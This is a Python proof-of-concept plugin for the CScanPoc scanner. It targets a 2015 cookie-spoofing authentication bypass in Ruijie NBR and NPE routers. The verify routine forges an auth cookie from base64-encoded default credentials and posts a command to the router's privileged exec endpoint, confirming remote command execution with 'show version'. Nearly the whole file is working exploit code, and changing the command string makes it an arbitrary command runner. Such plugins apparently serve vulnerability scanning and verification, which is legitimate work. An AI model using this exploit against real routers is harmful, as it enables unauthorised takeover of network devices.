# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse

class Vuln(ABVuln):
    vuln_id = 'Ruijie_0002' # 平台漏洞编号，留空
    name = '锐捷网络NBR部分路由器 cookie欺骗'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-10-22'  # 漏洞公布时间
    desc = '''
        锐捷网络NBR部分路由器cookie欺骗权限绕过，欺骗漏洞的基础上发现了远程的路由命令执行
        经过测试，发现锐捷的NBR NPE两个大类的路由器均存在此漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '锐捷网络'  # 漏洞应用名称
    product_version = 'NBR路由器'  # 漏洞应用版本

def base64(string):
    import base64
    return base64.b64encode(string)

class Poc(ABPoc):
    poc_id = '21a2f9f7-8060-46e4-b536-8b89fe8f9012'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0148657
            hh = hackhttp.hackhttp()
            users = ['manager:manager','guest:guest']
            for user in users:
                cookie = "c_name=; hardtype=NBR1500G; web-coding=gb2312; currentURL=; auth=" + base64(user) +"; user=admin"
                posturl =  "/WEB_VMS/LEVEL15/"
                command = "show version"
                post = "command=" + command + "&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."
                target = self.target + posturl
                code, head, res, errcode, _ = hh.http(target,post=post, cookie=cookie)
                # print res
                if code == 200 and "System software version" in res:
                    #security_hole(user +" | " + arg)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
